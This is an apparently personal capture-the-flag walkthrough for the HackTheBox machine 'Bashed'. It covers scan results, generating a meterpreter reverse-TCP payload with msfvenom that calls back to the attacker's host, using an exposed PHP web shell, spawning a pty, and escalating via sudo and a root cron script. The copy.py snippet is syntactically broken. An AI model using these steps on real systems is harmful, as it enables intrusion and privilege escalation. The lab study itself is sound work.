<h1>Bashed 10.10.10.68<h1>

<h2>Info</h2>
  nmap -Pn -p- -vv 10.10.10.68 -oX bashed.xml

  host         port  proto  name  state  info
  ----         ----  -----  ----  -----  ----
  10.10.10.68  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)

<h2>Nikto</h2>
  Server: Apache/2.4.18 (Ubuntu)
  + Server leaks inodes via ETags, header found with file /uploads/, fields: 0xe 0x55f89c79ffc7f
  + The anti-clickjacking X-Frame-Options header is not present.
  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS

<h2>Backdooring</h2>

lhost: 10.10.14.105

Setting up listener:
  use exploit/multi/handler
  set payload php/meterpreter_reverse_tcp
  set lhost 10.10.14.105
  set lport 4441
  run -z

Creating Payload:
  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.105 LPORT=4441 -f raw > shell4441.php

Start http server on LHOST
  python -m SimpleHTTPServer 8080



<h2>Linux Enum</h2>
  DISTRIB_ID=Ubuntu
  DISTRIB_RELEASE=16.04
  DISTRIB_CODENAME=xenial
  DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
  NAME="Ubuntu"
  VERSION="16.04.2 LTS (Xenial Xerus)"
  ID=ubuntu
  ID_LIKE=debian
  PRETTY_NAME="Ubuntu 16.04.2 LTS"
  VERSION_ID="16.04"
  HOME_URL="http://www.ubuntu.com/"
  SUPPORT_URL="http://help.ubuntu.com/"
  BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
  VERSION_CODENAME=xenial
  UBUNTU_CODENAME=xenial
  uname -a
  Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


<h2>Walktrough</h2>
  Go to: http://10.10.10.68/dev/phpbash.php
    cat /home/arrexel/user.txt
      2c281f318555dbc1b856957c7147bfc1

  Use wget (HTTP server on lhost first) setup to put shell that gives
  tty in /var/www/html/uploads eg. meterpreter
    $ shell
    $ python -c 'import pty;pty.spawn("/bin/bash")'
    $ sudo -u scriptmanager -i

  Make script copy.py and put in upload with wget like before:

  from shutil import copyfile

  copyfile(/root/root.txt, /tmp/root.txt)

  scriptmanager@bashed:/var/www/html/uploads$ cp copy.py /scripts/copy.py


  sudo -u <username> ls -la /scripts
    /usr/sbin/CRON -f


crontab process moniter
#!/bin/bash

#loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process")
    sleep 1
    old_process=$new_process
done
